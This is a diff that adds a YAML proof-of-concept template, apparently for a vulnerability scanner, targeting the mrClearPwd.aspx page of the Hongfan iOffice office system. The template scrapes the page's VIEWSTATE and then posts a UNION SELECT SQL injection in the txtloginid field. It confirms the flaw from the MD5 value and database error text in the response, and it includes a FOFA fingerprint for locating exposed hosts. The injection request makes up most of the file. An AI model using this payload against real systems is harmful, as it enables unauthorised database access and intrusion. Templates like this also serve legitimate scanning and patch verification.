@@ -1,0 +1,25 @@
+id: poc-yaml-hongfan-ioffice-mrclearpwd-aspx-sqli
+info:
+  name: 红帆ioffice mrClearPwd.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /ioffice/prg/mr/ClearPwd/mrClearPwd.aspx
+  expression: status_code == 200
+  output:
+  - regex_match(body,"name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(?P<VIEWSTATE>.*?)\"")
+- method: POST
+  path: /ioffice/prg/mr/ClearPwd/mrClearPwd.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={{.VIEWSTATE}}&__VIEWSTATEGENERATOR=6EE6100A&txtloginid=-1'+UNION+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+&grop1=rad2&txtmobileNO=1&txtmobile=13888888888&ok=%E7%A1%AE%E3%80%80%E8%AE%A4
+  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"iOffice")
+    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
